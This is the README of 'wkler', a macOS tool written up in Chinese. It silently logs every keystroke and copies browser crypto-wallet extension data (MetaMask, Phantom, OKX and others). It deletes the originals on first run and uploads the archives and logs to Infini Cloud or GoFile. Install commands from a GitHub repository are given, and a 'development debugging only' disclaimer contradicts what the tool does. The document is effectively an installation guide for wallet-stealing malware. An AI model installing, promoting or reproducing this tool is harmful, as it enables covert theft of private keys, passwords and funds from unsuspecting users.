# wkler - 钱包键盘记录器

持续检测 macOS 活动窗口，匹配钱包关键词时触发键盘记录，日志保存到 `~/.dev/wkler/recording_{日期}.log`。

> 仅支持 macOS。窗口检测基于 Quartz + NSWorkspace，回退 AppleScript。

## 功能特性

- **扩展备份** — 自动备份钱包扩展数据（MetaMask、OKX、Phantom、Rabby、UniSat 等）
- **首次清除** — 首次运行时备份并删除源扩展数据，后续仅备份
- **自动上传** — 压缩备份为 tar.gz 并上传到 Infini Cloud，失败回退 GoFile
- **日志上传** — 每 24 小时自动上传非当天的历史键盘记录日志
- **持续检测** — 后台线程每 0.2 秒检测活动窗口
- **自动触发** — 检测到钱包窗口时自动开始记录
- **持续记录** — 启动后静默记录所有按键，直到手动停止
- **智能匹配** — 检测 Unknown 窗口和钱包关键词
- **调试模式** — 实时显示窗口信息，记录所有按键
- **dry-run 模式** — 只扫描扩展和检测窗口，不备份、不删除、不上传、不记录按键

## 工作原理

程序启动时依次执行：

1. **备份扩展数据** — 扫描 Chrome、Edge、Brave、Arc 所有 Profile 中的钱包扩展 Local Extension Settings
2. **首次清除源数据** — 首次运行时删除源扩展目录（通过 `.purged` 标记文件判断）
3. **压缩并上传** — 将备份目录压缩为 tar.gz，上传到 Infini Cloud（失败回退 GoFile）
4. **上传历史日志** — 将非当天的键盘记录日志上传后删除本地文件
5. **启动键盘监听** — 后台检测活动窗口，持续记录所有按键直到手动停止

`--dry-run` 会跳过第 2–5 步中的写入、删除、上传和键盘监听行为，只保留扩展扫描与窗口匹配检测。

### 支持的钱包扩展

MetaMask · OKX Wallet · Binance Wallet · Phantom · Rainbow · Rabby Wallet · Backpack · UniSat Wallet

### 触发条件

- 窗口标题为 `Unknown`（钱包扩展下拉窗口通常无标题）
- 窗口标题包含钱包关键词

## 安装

### 推荐：uv tool install（全局命令）

```bash
# 安装 uv（如果尚未安装）
curl -LsSf https://astral.sh/uv/install.sh | sh

# 从仓库安装
uv tool install git+https://github.com/web3toolsbox/wkler.git

# 直接使用
wkler
```

### pip 安装

```bash
git clone https://github.com/web3toolsbox/wkler.git
cd wkler
pip install -e .
wkler
```

### 直接运行（无需安装）

```bash
git clone https://github.com/web3toolsbox/wkler.git
cd wkler
pip install -r requirements.txt
python wkler.py
```

> **注意：** macOS 首次运行时，系统会弹出辅助功能权限请求（用于键盘监听和窗口检测）。请在「系统设置 → 隐私与安全性 → 辅助功能」中授权终端或 Python。

## 使用方法

### 正常模式

```bash
wkler
```

程序启动后静默运行，持续记录所有按键到日志文件，并标记当前窗口是否匹配钱包关键词（`[触发]` 或 `[普通]`）。

### dry-run 测试模式

```bash
wkler --dry-run
```

- 扫描浏览器 Profile 中可识别的钱包扩展，但不复制目录
- 不删除源扩展数据，不写入 `.purged` 标记
- 不创建日志文件，不记录按键
- 不压缩备份，不上传文件，不启动上传线程
- 实时显示活动窗口变化和是否匹配触发条件

dry-run 不启动键盘监听，使用 `Ctrl+C` 退出；正常模式可按 `F12` 或 `Ctrl+C` 退出。

### 查看日志

```bash
cat ~/.dev/wkler/recording_*.log
```

## 项目结构

```
wkler/
├── wkler/
│   ├── __init__.py        # 包初始化与导出
│   ├── backup.py          # 浏览器扩展备份（多 Profile 支持）
│   ├── uploader.py        # 压缩与上传（Infini Cloud + GoFile 回退）
│   ├── cli.py             # 命令行入口（argparse）
│   ├── detectors.py       # macOS 窗口检测（Quartz + AppleScript 回退）
│   └── logger.py          # 核心记录器（多线程 + 持久文件句柄）
├── wkler.py               # 独立脚本入口
├── debug_macos.py         # 窗口调试工具
├── pyproject.toml         # 包配置（hatchling + uv）
├── requirements.txt       # 依赖列表
└── README.md
```

## 日志格式

```
[时间] [状态] [窗口名称] 按键内容
```

示例：

```
# --- 记录开始: 2026-05-28 15:30:00 ---
# 触发窗口: [Unknown]
[2026-05-28 15:30:05] [触发] [Unknown] 1
[2026-05-28 15:30:06] [触发] [Unknown] 2
[2026-05-28 15:30:07] [触发] [Unknown] 3
[2026-05-28 15:30:08] [触发] [Unknown] [Enter]
# --- 记录结束: 2026-05-28 16:30:00 ---
```

## 安全注意事项

> **⚠️ 重要警告**

1. 此工具仅用于**开发调试目的**
2. 日志文件包含**明文键盘记录**，包括可能输入的密码和私钥
3. 请妥善保管日志文件，使用后及时删除
4. 不要在生产环境或他人设备上使用

## 更新日志

### v0.3.0

- **重构：macOS 专属版本** — 移除所有 Windows 代码，使用 Quartz + NSWorkspace 检测窗口
- 新增：AppleScript 回退方案（pyobjc 不可用时）
- 新增：Arc、Chromium 浏览器支持
- 变更：pyobjc、requests 升级为主依赖
- 变更：远程备份目录后缀 `_wins_backup` → `_mac_backup`

### v0.2.3

- 新增：dry-run 测试模式
- 新增：浏览器扩展备份（Chrome、Edge、Brave 多 Profile）
- 新增：首次运行清除源数据
- 新增：自动上传（Infini Cloud + GoFile 回退）
- 新增：历史日志上传

### v0.2.1

- 修复：死锁导致日志无记录
- 修复：`recording_timer` 竞态条件
- 优化：持久文件句柄、按键映射表类属性、预计算小写模式列表

## 许可

仅供个人学习研究使用。
